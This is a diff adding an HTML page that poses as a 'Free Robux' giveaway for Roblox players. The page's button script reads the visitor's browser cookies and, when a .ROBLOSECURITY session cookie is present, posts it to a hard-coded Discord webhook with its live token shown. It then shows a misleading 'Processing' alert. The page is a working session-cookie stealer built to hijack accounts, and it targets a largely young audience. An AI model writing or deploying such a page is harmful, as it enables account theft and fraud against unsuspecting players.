@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Free Robux</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #1B2A44; color: #fff; font-family: Arial; text-align: center; }
+        .btn-roblox { background: #00b06f; color: #fff; padding: 15px; font-size: 18px; border: none; }
+        .container { margin-top: 50px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Free Robux!</h1>
+        <p>Tap the button to claim your reward!</p>
+        <button class="btn-roblox" onclick="captureCookie()">Tap to Claim Free Robux</button>
+    </div>
+    <script>
+        function captureCookie() {
+            let cookie = document.cookie;
+            if (cookie.includes('.ROBLOSECURITY')) {
+                fetch('https://discord.com/api/webhooks/1397667597784453210/5Ync1yXCfohUTF3Ey_ljtKLjDn37K3GEqPLndRZwVZU0onGSLuEhgaOMICmVzOpJP_F2', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `Cookie: ${cookie}` })
+                })
+                .then(() => alert('Processing... Check back soon!'))
+                .catch(() => alert('Error, try again!'));
+            } else {
+                alert('Please log in to Roblox first!');
+            }
+        }
+    </script>
+</body>
+</html>
